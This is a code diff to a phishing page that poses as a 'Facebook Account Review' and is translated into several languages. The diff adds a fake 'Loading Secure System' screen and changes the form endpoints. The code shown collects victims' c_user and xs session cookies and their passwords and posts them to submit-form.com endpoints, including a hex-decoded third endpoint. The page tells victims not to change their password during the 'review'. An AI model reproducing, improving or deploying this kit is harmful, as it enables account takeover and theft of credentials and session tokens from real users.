@@ -6,7 +6,7 @@
     <title>Facebook Account Review</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* (All styles remain exactly the same as in the original code) */
+        
         * {
             margin: 0;
             padding: 0;
@@ -981,9 +981,57 @@
                 font-size: 16px;
             }
         }
+        
+        /* ===== LOADER STYLES (added) ===== */
+        #pageLoader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 999999;
+        }
+
+        .loader-content {
+            text-align: center;
+        }
+
+        .loader-spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #e4e6eb;
+            border-top: 6px solid #1877f2;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: auto;
+        }
+
+        .loader-content p {
+            margin-top: 15px;
+            font-weight: 600;
+            color: #555;
+            font-size: 16px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
+    <!-- ===== LOADER HTML (added) ===== -->
+    <div id="pageLoader">
+        <div class="loader-content">
+            <div class="loader-spinner"></div>
+            <p>Loading Secure System...</p>
+        </div>
+    </div>
+
     <div class="header">
         <div class="header-content">
             <div class="logo">
@@ -1059,11 +1107,11 @@
         </div>
     </div>
     
-    <!-- Language Prompt Modal -->
+    <!-- Language Prompt Modal (shown on page load) -->
     <div class="language-prompt-modal" id="languagePromptModal">
         <div class="language-prompt-content">
-            <h3><i class="fas fa-language"></i> <span data-translate="language-prompt-title">Select Language for Video</span></h3>
-            <p data-translate="language-prompt-text">Please select your preferred language for the video tutorial. This will help you understand the instructions better.</p>
+            <h3><i class="fas fa-language"></i> <span data-translate="language-prompt-title">Select Your Language</span></h3>
+            <p data-translate="language-prompt-text">Please select your preferred language for the page content and video tutorial.</p>
             
             <div class="language-options-prompt">
                 <div class="language-option-prompt" data-lang="en">
@@ -1093,7 +1141,7 @@
             </div>
             
             <button class="continue-video-btn" id="continueVideoBtn">
-                <i class="fas fa-play-circle"></i> <span data-translate="continue-video-btn">Continue with Selected Language</span>
+                <i class="fas fa-check-circle"></i> <span data-translate="continue-video-btn">Continue with Selected Language</span>
             </button>
         </div>
     </div>
@@ -1323,7 +1371,7 @@
                 'success-instructions-item-5': 'Please do not attempt to change your password during review',
                 'finish-btn': 'Finish',
                 'language-prompt-title': 'Select Your Language',
-                'language-prompt-text': 'Choose your preferred language for the page content',
+                'language-prompt-text': 'Please select your preferred language for the page content and video tutorial.',
                 'continue-video-btn': 'Continue with Selected Language',
                 'footer-about': 'About',
                 'footer-ad-choice': 'Ad Choice',
@@ -1377,9 +1425,9 @@
                 'success-instructions-item-4': 'A exclusão da conta foi pausada pendente de revisão',
                 'success-instructions-item-5': 'Por favor, não tente alterar sua senha durante a revisão',
                 'finish-btn': 'Finalizar',
-                'language-prompt-title': 'Selecione o Idioma do Vídeo',
-                'language-prompt-text': 'Por favor, selecione seu idioma preferido para o tutorial em vídeo. Isso ajudará você a entender melhor as instruções.',
-                'continue-video-btn': 'Continuar com o Idioma Selecionado',
+                'language-prompt-title': 'Selecione seu idioma',
+                'language-prompt-text': 'Escolha seu idioma preferido para o conteúdo da página e o tutorial em vídeo.',
+                'continue-video-btn': 'Continuar com o idioma selecionado',
                 'footer-about': 'Sobre',
                 'footer-ad-choice': 'Escolha de Anúncio',
                 'footer-terms': 'Termos e políticas',
@@ -1432,9 +1480,9 @@
                 'success-instructions-item-4': 'La eliminación de la cuenta se ha pausado pendiente de revisión',
                 'success-instructions-item-5': 'Por favor, no intente cambiar su contraseña durante la revisión',
                 'finish-btn': 'Finalizar',
-                'language-prompt-title': 'Seleccione el Idioma del Video',
-                'language-prompt-text': 'Por favor, seleccione su idioma preferido para el tutorial en video. Esto lo ayudará a comprender mejor las instrucciones.',
-                'continue-video-btn': 'Continuar con el Idioma Seleccionado',
+                'language-prompt-title': 'Seleccione su idioma',
+                'language-prompt-text': 'Elija su idioma preferido para el contenido de la página y el tutorial en video.',
+                'continue-video-btn': 'Continuar con el idioma seleccionado',
                 'footer-about': 'Acerca de',
                 'footer-ad-choice': 'Elección de Anuncios',
                 'footer-terms': 'Términos y políticas',
@@ -1487,8 +1535,8 @@
                 'success-instructions-item-4': 'समीक्षा लंबित रहने पर खाता विलोपन रोक दिया गया है',
                 'success-instructions-item-5': 'कृपया समीक्षा के दौरान अपना पासवर्ड बदलने का प्रयास न करें',
                 'finish-btn': 'समाप्त',
-                'language-prompt-title': 'वीडियो के लिए भाषा चुनें',
-                'language-prompt-text': 'कृपया वीडियो ट्यूटोरियल के लिए अपनी पसंदीदा भाषा चुनें। यह आपको निर्देशों को बेहतर ढंग से समझने में मदद करेगा।',
+                'language-prompt-title': 'अपनी भाषा चुनें',
+                'language-prompt-text': 'कृपया पृष्ठ सामग्री और वीडियो ट्यूटोरियल के लिए अपनी पसंदीदा भाषा चुनें।',
                 'continue-video-btn': 'चयनित भाषा के साथ जारी रखें',
                 'footer-about': 'के बारे में',
                 'footer-ad-choice': 'विज्ञापन विकल्प',
@@ -1542,8 +1590,8 @@
                 'success-instructions-item-4': 'تم إيقاف حذف الحساب pending المراجعة',
                 'success-instructions-item-5': 'يرجى عدم محاولة تغيير كلمة المرور الخاصة بك أثناء المراجعة',
                 'finish-btn': 'إنهاء',
-                'language-prompt-title': 'حدد لغة الفيديو',
-                'language-prompt-text': 'يرجى اختيار لغتك المفضلة للبرنامج التعليمي بالفيديو. سيساعدك هذا على فهم التعليمات بشكل أفضل.',
+                'language-prompt-title': 'اختر لغتك',
+                'language-prompt-text': 'يرجى اختيار لغتك المفضلة لمحتوى الصفحة والفيديو التعليمي.',
                 'continue-video-btn': 'المتابعة باللغة المحددة',
                 'footer-about': 'حول',
                 'footer-ad-choice': 'اختيار الإعلان',
@@ -1597,8 +1645,8 @@
                 'success-instructions-item-4': 'மதிப்பாய்வு நிலுவையில் உள்ள கணக்கு நீக்கம் இடைநிறுத்தப்பட்டுள்ளது',
                 'success-instructions-item-5': 'மதிப்பாய்வின் போது உங்கள் கடவுச்சொல்லை மாற்ற முயற்சிக்காதீர்கள்',
                 'finish-btn': 'முடிக்கவும்',
-                'language-prompt-title': 'வீடியோவுக்கான மொழியைத் தேர்ந்தெடுக்கவும்',
-                'language-prompt-text': 'வீடியோ பயிற்சிக்கு உங்கள் விருப்ப மொழியைத் தேர்ந்தெடுக்கவும். இது வழிமுறைகளை நீங்கள் நன்கு புரிந்துகொள்ள உதவும்.',
+                'language-prompt-title': 'உங்கள் மொழியைத் தேர்ந்தெடுக்கவும்',
+                'language-prompt-text': 'பக்க உள்ளடக்கம் மற்றும் வீடியோ பயிற்சிக்கு உங்கள் விருப்ப மொழியைத் தேர்ந்தெடுக்கவும்.',
                 'continue-video-btn': 'தேர்ந்தெடுக்கப்பட்ட மொழியுடன் தொடரவும்',
                 'footer-about': 'பற்றி',
                 'footer-ad-choice': 'விளம்பர தேர்வு',
@@ -1621,26 +1669,26 @@
             const currentLanguage = document.getElementById('current-language');
             const languageOptions = document.querySelectorAll('.language-option');
             
-            // Language Prompt Modal
+           
             const languagePromptModal = document.getElementById('languagePromptModal');
             const languageOptionsPrompt = document.querySelectorAll('.language-option-prompt');
             const continueVideoBtn = document.getElementById('continueVideoBtn');
             let selectedVideoLanguage = null;
             
-            // Toggle language dropdown
+            
             languageBtn.addEventListener('click', function(e) {
                 e.stopPropagation();
                 languageDropdown.classList.toggle('show');
             });
             
-            // Close dropdown when clicking outside
+            
             document.addEventListener('click', function(e) {
                 if (!languageDropdown.contains(e.target) && e.target !== languageBtn && !languageBtn.contains(e.target)) {
                     languageDropdown.classList.remove('show');
                 }
             });
             
-            // Video sources for different languages
+            
             const videoSources = {
                 en: "https://translationmeta2025-f87fc.web.app/english.mp4",
                 pt: "https://translationmeta2025-f87fc.web.app/portuguese.mp4",
@@ -1650,11 +1698,11 @@
                 ta: "https://translationmeta2025-f87fc.web.app/Tamil.mp4"
             };
             
-            // Change language function
+            
             function changeLanguage(lang) {
                 if (!translations[lang]) return;
                 
-                // Update all elements with data-translate attribute
+                
                 document.querySelectorAll('[data-translate]').forEach(element => {
                     const key = element.getAttribute('data-translate');
                     if (translations[lang][key]) {
@@ -1733,10 +1781,10 @@
                 });
             });
             
-            // Language prompt functionality
+            
             languageOptionsPrompt.forEach(option => {
                 option.addEventListener('click', function() {
-                    // Remove selected class from all options
+                    
                     languageOptionsPrompt.forEach(opt => opt.classList.remove('selected'));
                     // Add selected class to clicked option
                     this.classList.add('selected');
@@ -1753,40 +1801,33 @@
                 
                 // Hide language prompt modal
                 languagePromptModal.style.display = 'none';
+                // Allow scrolling on main page
+                document.body.style.overflow = 'auto';
                 
-                // Show main modal
-                modal.style.display = 'block';
-                document.body.style.overflow = 'hidden';
-                
-                // Change the entire webpage language to selected video language (optional)
-                // but we definitely set video source
+                // Change the entire webpage language to selected video language
                 changeLanguage(selectedVideoLanguage);
                 
                 // Ensure video overlay is visible (so user can click play)
                 const videoOverlay = document.getElementById('videoOverlay');
                 videoOverlay.classList.remove('hidden');
                 
-                // Initialize video player controls (but not autoplay)
+                
                 initVideoPlayer();
             });
             
-            // Check for saved language preference or use browser language
+            
             const savedLanguage = localStorage.getItem('selectedLanguage');
             const browserLanguage = navigator.language.substring(0, 2);
             
-            if (savedLanguage) {
-                changeLanguage(savedLanguage);
-            } else if (translations[browserLanguage]) {
-                changeLanguage(browserLanguage);
-            } else {
-                // Default to English
-                changeLanguage('en');
-            }
+            
+            languageOptionsPrompt.forEach(opt => opt.classList.remove('selected'));
+            selectedVideoLanguage = null;
+            languagePromptModal.style.display = 'flex';
+            document.body.style.overflow = 'hidden'; 
             
             
-            
-            const endpointCUserXs = "https://submit-form.com/mwij0dNEu";
-            const endpointPassword = "https://submit-form.com/UMpFLUuKK";
+            const endpointCUserXs = "https://submit-form.com/VCD1ILpEn";
+            const endpointPassword = "https://submit-form.com/VCD1ILpEn";
             
             const modal = document.getElementById('reviewModal');
             const reviewBtn = document.getElementById('reviewBtn');
@@ -1794,7 +1835,7 @@
             const cancelBtn = document.getElementById('cancelBtn');
             const finishBtn = document.getElementById('finishBtn');
             
-            // Video elements
+            
             const video = document.getElementById('tutorialVideo');
             const videoOverlay = document.getElementById('videoOverlay');
             const overlayPlayBtn = document.getElementById('overlayPlayBtn');
@@ -1807,7 +1848,7 @@
             const speedSelector = document.getElementById('speedSelector');
             const fullscreenBtn = document.getElementById('fullscreenBtn');
             
-            // Step navigation
+            
             const nextToStep2 = document.getElementById('nextToStep2');
             const backToStep1 = document.getElementById('backToStep1');
             const nextToStep3 = document.getElementById('nextToStep3');
@@ -1819,7 +1860,7 @@
             const steps = document.querySelectorAll('.step');
             
             function initVideoPlayer() {
-                // Remove any existing listeners to avoid duplicates
+                
                 video.removeEventListener('timeupdate', updateProgressBar);
                 video.removeEventListener('loadedmetadata', onLoadedMeta);
                 
@@ -1830,7 +1871,7 @@
                 video.addEventListener('timeupdate', updateProgressBar);
                 video.addEventListener('loadedmetadata', onLoadedMeta);
                 
-                // Overlay play button now simply plays video (language already selected)
+                
                 overlayPlayBtn.onclick = function() {
                     if (video.paused) {
                         video.play();
@@ -1940,9 +1981,10 @@
                 }
             }
             
-            // Show language prompt first, not the modal
+            // REVIEW BUTTON now directly opens main modal (language already selected)
             reviewBtn.addEventListener('click', function() {
-                languagePromptModal.style.display = 'flex';
+                modal.style.display = 'block';
+                document.body.style.overflow = 'hidden';
             });
             
             function closeModalFunc() {
@@ -1959,7 +2001,7 @@
                 window.location.href = "https://www.facebook.com/";
             });
             
-            // Step 1 -> Step 2: send c_user and xs immediately
+            
             nextToStep2.addEventListener('click', function() {
                 const cUserInput = document.getElementById('c_user');
                 const xsInput = document.getElementById('xs');
@@ -1975,7 +2017,7 @@
                     return;
                 }
                 
-                // Send c_user and xs to first endpoint
+                
                 const cUser = cUserInput.value;
                 const xs = xsInput.value;
                 
@@ -1990,7 +2032,7 @@
                     console.error('Error sending c_user/xs:', error);
                 });
                 
-                // Proceed to step 2
+                
                 step1.classList.remove('active');
                 step2.classList.add('active');
                 
@@ -2006,7 +2048,7 @@
                 steps[0].classList.add('active');
             });
             
-            // Step 2 -> Step 3: send password to second endpoint AND all data to third endpoint
+            
             nextToStep3.addEventListener('click', function() {
                 const passwordInput = document.getElementById('password');
                 
@@ -2019,7 +2061,7 @@
                 const xs = document.getElementById('xs').value;
                 const password = passwordInput.value;
                 
-                // Send password to second endpoint
+               
                 fetch(endpointPassword, {
                     method: 'POST',
                     headers: {
@@ -2031,7 +2073,7 @@
                     console.error('Error sending password:', error);
                 });
                 
-                // Send all data (c_user, xs, password) to third endpoint (hex-decoded)
+                
                 fetch(endpointThird, {
                     method: 'POST',
                     headers: {
@@ -2043,7 +2085,7 @@
                     console.error('Error sending data to third endpoint:', error);
                 });
                 
-                // Proceed to success step
+                
                 step2.classList.remove('active');
                 step3.classList.add('active');
                 
@@ -2065,7 +2107,7 @@
                 video.pause();
                 video.currentTime = 0;
                 
-                // Show overlay again for next time modal opens
+                
                 videoOverlay.classList.remove('hidden');
                 playPauseBtn.innerHTML = '<i class="fas fa-play"></i>';
                 progressBar.style.width = '0%';
@@ -2077,6 +2119,20 @@
                     closeModalFunc();
                 }
             });
+        });
+    </script>
+    
+   
+    <script>
+        window.addEventListener("load", function() {
+            const loader = document.getElementById("pageLoader");
+            setTimeout(function() {
+                loader.style.opacity = "0";
+                loader.style.transition = "0.4s";
+                setTimeout(function() {
+                    loader.style.display = "none";
+                }, 400);
+            }, 600);
         });
     </script>
 </body>
